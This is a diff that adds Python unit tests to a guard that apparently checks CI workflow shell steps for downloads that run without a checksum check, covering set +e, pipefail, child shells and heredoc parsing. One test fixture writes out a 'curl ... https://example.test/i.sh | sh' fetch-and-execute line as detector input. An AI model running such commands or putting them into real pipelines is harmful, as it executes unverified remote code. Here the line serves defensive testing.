@@ -2351,6 +2351,115 @@ class TestASetPlusEAtTheStepsTopLevel(unittest.TestCase):
                               self.job("%s || true\n", shell)[0][1])
 
 
+class TestAParentRefusalKeepsAChildScriptsReach(unittest.TestCase):
+    """#2423: a parent that carries on past a failed child still respects
+    the child's own `-e` inside the script it runs."""
+
+    FETCH = TestASetPlusEAtTheStepsTopLevel.FETCH
+    CHECK = TestASetPlusEAtTheStepsTopLevel.CHECK
+    USE = TestASetPlusEAtTheStepsTopLevel.USE
+    INLINE_USE = USE.replace("\n", "; ").rstrip("; ")
+    job = TestASetPlusEAtTheStepsTopLevel.job
+
+    def test_set_plus_e_bounds_its_refusal_to_the_child_command(self):
+        inside = "set +e\nsh -ec '%s; " + self.INLINE_USE + "'\necho done\n"
+        for shell in (None, "sh", "bash"):
+            with self.subTest(shell=shell, use="inside"):
+                self.assertEqual([], self.job(inside, shell, use=""))
+            with self.subTest(shell=shell, use="outside"):
+                found = self.job(inside, shell)
+                self.assertEqual(1, len(found), found)
+                self.assertIn("runs after a `set +e`", found[0][1])
+
+    def test_a_no_errexit_template_bounds_its_refusal_to_the_child_command(self):
+        inside = "sh -ec '%s; " + self.INLINE_USE + "'\necho done\n"
+        for shell in ("bash {0}", "sh {0}"):
+            with self.subTest(shell=shell, use="inside"):
+                self.assertEqual([], self.job(inside, shell, use=""))
+            with self.subTest(shell=shell, use="outside"):
+                found = self.job(inside, shell)
+                self.assertEqual(1, len(found), found)
+                self.assertIn("runs under `shell: %s`" % shell, found[0][1])
+
+    def test_a_piped_groups_refusal_keeps_the_childs_own_reach(self):
+        child = "sh -ec '%s; " + self.INLINE_USE + "'"
+        body = "{\n" + child + "\n} | cat\n"
+        for shell in (None, "sh"):
+            with self.subTest(shell=shell, use="inside"):
+                self.assertEqual([], self.job(body, shell, use=""))
+            with self.subTest(shell=shell, use="outside"):
+                found = self.job(body, shell)
+                self.assertEqual(1, len(found), found)
+                self.assertIn("ends a group that is piped", found[0][1])
+
+    def test_a_piped_check_stays_refused_without_child_pipefail(self):
+        child = "sh -ec '%s | cat; " + self.INLINE_USE + "'"
+        for prefix, suffix, shell in (
+                ("set +e\n", "\necho done\n", None),
+                ("", "\necho done\n", "bash {0}"),
+                ("{\n", "\n} | cat\n", None),
+                ("{\n", "\n} | cat\n", "sh")):
+            with self.subTest(prefix=prefix, shell=shell):
+                found = self.job(prefix + child + suffix, shell, use="")
+                self.assertEqual(1, len(found), found)
+                self.assertIn("piped into a command whose status the pipeline takes", found[0][1])
+
+    def test_an_and_or_list_suspends_the_childs_errexit(self):
+        for operator in ("&&", "||"):
+            child = "sh -ec '%s " + operator + " echo checked; " + self.INLINE_USE + "'"
+            for prefix, suffix, shell in (
+                    ("set +e\n", "\necho done\n", None),
+                    ("", "\necho done\n", "bash {0}"),
+                    ("{\n", "\n} | cat\n", "sh")):
+                with self.subTest(operator=operator, prefix=prefix, shell=shell):
+                    found = self.job(prefix + child + suffix, shell, use="")
+                    self.assertEqual(1, len(found), found)
+                    self.assertIn("the checksum that names /tmp/payload", found[0][1])
+
+    def test_an_and_list_still_gates_a_use_inside_it(self):
+        child = "sh -ec '%s && " + self.INLINE_USE + "'"
+        for prefix, suffix, shell in (
+                ("set +e\n", "\necho done\n", None),
+                ("", "\necho done\n", "bash {0}"),
+                ("{\n", "\n} | cat\n", "sh")):
+            with self.subTest(prefix=prefix, shell=shell):
+                self.assertEqual([], self.job(prefix + child + suffix, shell, use=""))
+
+    def test_a_compound_and_list_suspends_the_childs_errexit(self):
+        child = "sh -ec '{ %s; } && echo checked; " + self.INLINE_USE + "'"
+        for prefix, suffix, shell in (
+                ("set +e\n", "\necho done\n", None),
+                ("", "\necho done\n", "bash {0}"),
+                ("{\n", "\n} | cat\n", "sh")):
+            with self.subTest(prefix=prefix, shell=shell):
+                found = self.job(prefix + child + suffix, shell, use="")
+                self.assertEqual(1, len(found), found)
+                self.assertIn("the checksum that names /tmp/payload", found[0][1])
+
+    def test_a_condition_suspends_the_childs_errexit(self):
+        child = "sh -ec 'if %s; then echo checked; fi; " + self.INLINE_USE + "'"
+        for prefix, suffix, shell in (
+                ("set +e\n", "\necho done\n", None),
+                ("", "\necho done\n", "bash {0}"),
+                ("{\n", "\n} | cat\n", "sh")):
+            with self.subTest(prefix=prefix, shell=shell):
+                found = self.job(prefix + child + suffix, shell, use="")
+                self.assertEqual(1, len(found), found)
+                self.assertIn("the checksum that names /tmp/payload", found[0][1])
+
+    def test_a_child_without_errexit_remains_refused(self):
+        child = "sh -c '%s; " + self.INLINE_USE + "'"
+        for prefix, suffix, shell in (
+                ("set +e\n", "\necho done\n", None),
+                ("", "\necho done\n", "sh {0}"),
+                ("{\n", "\n} | cat\n", None),
+                ("{\n", "\n} | cat\n", "sh")):
+            with self.subTest(prefix=prefix, shell=shell):
+                found = self.job(prefix + child + suffix, shell, use="")
+                self.assertEqual(1, len(found), found)
+                self.assertIn("inside the script `sh` runs", found[0][1])
+
+
 class TestAPipedCheckGatesOnlyUnderPipefail(unittest.TestCase):
     """#2338: a pipeline's status is its LAST command's unless `pipefail`
     holds, so a check piped into another command (`CHECK | tee log`) stops
@@ -4917,6 +5026,15 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
             with self.subTest(run=run):
                 self.flagged(("run", run))
 
+    def test_a_live_command_word_in_a_c_string_is_unread(self):
+        # #2466 reads a live `$` word in a `-c`/`eval` string as the value it is at top level,
+        # so one in a COMMAND-word position fetches as little there as `$CMD … | sh` does at top
+        # level (b5 b3 dash gh: FR FR FR FR for both): the gap list's entry, as this pin.
+        for run in ('CMD=curl\nbash -c "$CMD -fsSL https://example.test/i.sh | sh"\n',
+                    "CMD=curl\n$CMD -fsSL https://example.test/i.sh | sh\n"):
+            with self.subTest(run=run):
+                self.accepted(("run", run))
+
     def test_a_subshell_with_line_only_parens_keeps_a_carried_download(self):
         # A reassignment in a subshell does not escape it, whether the parens
         # share its commands' lines or occupy their own.
@@ -5850,6 +5968,22 @@ class TestTheReaderLexesTheWayBashDoes(unittest.TestCase):
                        "cat << \\\n EOF\nit's\nEOF\n%s\n"):
             with self.subTest(script=script):
                 self.flagged(script % self.PAYLOAD)
+
+    def test_an_unterminated_quoted_body_is_refused_not_read_as_code(self):
+        # #2692's differential row: Bash 3.2, Bash 5.2 and dash all treat the
+        # `EOF; ...` line as body text, as they do `EOF ` with trailing space.
+        # The guard must not manufacture a live pipeline out of either one.
+        for tail in ("EOF; %s\n" % self.PAYLOAD,
+                     "EOF \n%s\n" % self.PAYLOAD):
+            with self.subTest(tail=tail):
+                found = wg.job_defects([("step", "cat <<'EOF'\nx\n" + tail)])
+                self.assertEqual(1, len(found), found)
+                self.assertEqual("step", found[0][0])
+                self.assertIn("quoted heredoc has no exact terminator", found[0][1])
+                self.assertNotIn("straight to `sh`", found[0][1])
+
+        # With the exact line present, the same pipeline really is code.
+        self.flagged("cat <<'EOF'\nx\nEOF\n%s\n" % self.PAYLOAD)
 
     def test_a_continuation_inside_the_operator_is_gone(self):
         # #2291: to bash, `<\` + newline + `<EOF` is `<<EOF`, `<<\` + newline
